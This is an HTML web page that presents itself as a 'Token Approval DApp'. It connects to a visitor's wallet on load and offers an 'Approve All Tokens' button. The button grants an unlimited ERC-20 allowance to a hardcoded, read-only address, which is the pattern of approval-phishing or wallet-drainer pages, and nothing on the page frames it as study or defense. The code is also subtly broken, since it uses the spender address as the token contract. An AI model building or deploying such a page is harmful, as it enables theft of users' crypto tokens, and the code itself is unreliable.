a<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Approval DApp</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
</head>
<body>
    <h1>Token Approval DApp</h1>
    <div>
        <label for="spender">Spender Address (Contract Address):</label>
        <input type="text" id="spender" value="0x8816e4c39472B5Ce851fB8cB271de419bF638f43" readonly>
    </div>
    <div>
        <button onclick="approveAllTokens()">Approve All Tokens</button>
    </div>
    <div id="status"></div>

    <script>
        let web3;
        const contractAddress = '0x8816e4c39472B5Ce851fB8cB271de419bF638f43';
        
        async function initWeb3() {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                try {
                    // Request account access
                    await window.ethereum.enable();
                    document.getElementById('status').innerText = "Web3 Connected!";
                } catch (error) {
                    document.getElementById('status').innerText = "User denied account access";
                }
            } else if (window.web3) {
                web3 = new Web3(web3.currentProvider);
                document.getElementById('status').innerText = "Web3 Detected!";
            } else {
                document.getElementById('status').innerText = "Please install MetaMask!";
            }
        }

        async function approveAllTokens() {
            if (!web3) {
                document.getElementById('status').innerText = "Please connect to Web3 first.";
                return;
            }

            const tokenContract = new web3.eth.Contract(ABI, contractAddress);
            const accounts = await web3.eth.getAccounts();
            const spender = document.getElementById('spender').value;

            try {
                await tokenContract.methods.approve(spender, web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({from: accounts[0]});
                document.getElementById('status').innerText = "Approval successful!";
            } catch (error) {
                document.getElementById('status').innerText = "Error: " + error.message;
            }
        }

        // Initialize web3 on page load
        window.onload = initWeb3;

        // ABI from your provided code
        const ABI = [
            {
                "inputs": [
                    {"internalType": "address", "name": "spender", "type": "address"},
                    {"internalType": "uint256", "name": "amount", "type": "uint256"}
                ],
                "name": "approve",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];
    </script>
</body>
</html>
